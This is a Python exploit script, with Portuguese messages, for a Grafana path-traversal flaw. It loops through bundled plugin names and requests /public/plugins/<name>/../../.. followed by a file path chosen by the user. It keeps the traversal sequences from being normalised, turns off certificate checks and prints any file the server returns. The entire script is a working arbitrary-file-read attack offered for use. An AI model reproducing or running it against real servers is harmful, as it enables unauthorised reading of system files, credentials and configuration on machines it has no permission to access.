import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("-u", help="Nome do Host")
parser.add_argument("-f", help="Arquivo a ser lido")
args = parser.parse_args()

headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.' }
s = requests.Session()

lista_plugins = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin"
]

for plugin_name in lista_plugins:
    url = f"http://{args.u}/public/plugins/{plugin_name}/../../../../../../../..{args.f}"
    req = requests.Request(method='GET', url=url, headers=headers)
    prep = req.prepare()
    prep.url = url
    r = s.send(prep, verify=False)
    if r.status_code == 200:
        print(f"[*] Plugin vulner√°vel encontrado [*]: {plugin_name}\n")
        print(r.text)
        break
